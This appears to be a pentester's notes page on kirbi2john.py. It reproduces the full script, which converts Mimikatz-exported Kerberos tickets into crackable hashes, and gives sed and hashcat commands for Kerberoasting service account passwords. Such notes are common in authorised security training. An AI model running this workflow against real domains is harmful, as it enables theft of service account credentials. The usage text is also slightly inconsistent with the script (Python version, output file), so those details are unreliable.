---
title: kirbi2john
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - mimikatz
  - kerberos
---
# kirbi2john.py

## Installation

At: [https://github.com/nidem/kerberoast/blob/master/kirbi2john.py](https://github.com/nidem/kerberoast/blob/master/kirbi2john.py).

Being the following script:


```
#!/usr/bin/env -S python3 -tt
# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets from a kirbi file.
# Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
# Copyright [2015] [Tim Medin, Michael Kramer]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License

from pyasn1.codec.ber import encoder, decoder
import glob
import kerberos


if __name__ == '__main__':
	import argparse
	import sys

	parser = argparse.ArgumentParser(description='Read Mimikatz kerberos ticket then modify it and save it in crack_file')
	parser.add_argument('-o', dest='crack_file', metavar='crack_file', type=argparse.FileType('w'), default=sys.stdout, nargs='?',
					help='File to save crackable output to (default is stdout')
	parser.add_argument('files', nargs='+', metavar='file.kirbi', type=str,
					help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')

	args = parser.parse_args()

	enctickets = []

	for path in args.files:
		for filename in glob.glob(path):
			et = kerberos.extract_ticket_from_kirbi(filename)
			if et:
				enctickets.append((et,filename))

	#out=open("crack_file","wb")
	for et in enctickets:
		filename = et[1].split('/')[-1].split('\\')[-1].replace('.kirbi','')

		out = '$krb5tgs$23$*' + filename + '*$' + et[0][:16].hex() + '$' +et[0][16:].hex() + '\n'

		args.crack_file.writelines(out)
	sys.stderr.write('tickets written: ' + str(len(enctickets)) + '\n')
```


## Basic usage

```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

Cracking the Hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```
